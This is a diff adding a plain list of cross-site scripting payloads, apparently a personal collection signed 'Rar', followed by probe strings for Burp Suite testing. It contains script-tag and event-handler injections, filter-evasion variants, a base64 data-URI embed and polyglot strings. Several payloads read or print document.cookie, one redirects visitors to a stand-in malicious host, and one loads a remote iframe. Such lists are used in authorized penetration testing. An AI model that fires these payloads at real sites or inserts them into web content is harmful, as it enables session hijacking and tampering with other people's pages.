@@ -1,0 +1,96 @@
+<script>alert(123)</script>
+
+''><script>alert(1)</script>
+''><script>confirm(1)</script>
+
+<script>alert(document.cookie)</script>
+
+""><script>window.location='http://some-thing-evil.com/'</script>
+
+<body onload=alert('test1')>
+
+rar@aa.com"><script>alert(document.cookie)</script>
+
+""><img src="xix" onerror=document.write(document.cookie)>
+
+<h1><font color=blue>xss by Rar</h1>
+
+"><marquee><font color=blue>xss-by-Rar</marquee>
+
+""><img src="https://i.ibb.co/TMnzYtD/RARME.png">
+
+"><img src="https://i.ibb.co/TMnzYtD/RARME.png">
+
+"><IMG SRC=https://i.ibb.co/TMnzYtD/RARME.png onmouseover="alert('XSS BY RAR')">
+
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>
+<script>alert(document.cookie)</script>">
+
+<img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'">
+
+<img src="https://i.ibb.co/TMnzYtD/RARME.png">
+
+"/\"><marquee><img src="https://i.ibb.co/TMnzYtD/RARME.png"></marquee>
+
+<sVg oNloaD=write("RAR")>
+
+
+<script ~~~>alert(0%0)</script ~~~>
+
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+
+IMG SRC=”javascript:alert(‘XSS’)”
+<iframe src=http://ha.ckers.org/scriptlet.html <
+
+<? foo="><script>alert(1)</script>">
+<! foo="><script>alert(1)</script>">
+</ foo="><script>alert(1)</script>">
+
+<form id="test" /><button form="test" formaction="javascript:alert(123)">Rar?
+
+‘; alert(document.cookie); var foo=’
+
+foo\’; alert(document.cookie);//’;
+
+</script><script >alert(document.cookie)</script>
+
+<img src=asdf onerror=alert(document.cookie)>
+
+<BODY ONLOAD=alert(’XSS’)>
+
+<script>alert(1)</script>
+
+"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+
+<video src=1 onerror=alert(1)>
+
+<audio src=1 onerror=alert(1)>
+++++++++++++++++++++++++++++++++++++++++++++++++
+TEST payloads for burpsuite:=                                
+<                                              
+>
+<>
+"
+'
+(
+)
+<x>
+<img>
+<iframe>
+<script>
+<+script>
+<+script/**/>
+<iFraME>
+<ScrIPT>
+<<SCRIPT>
+++++++++++++++++++++++++++++++++++++++++++++++
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+
+<!--<img src="--><img src=x onerror=alert(123)//">
+
+“><ScRiPt>alert(document.cookie)</script>
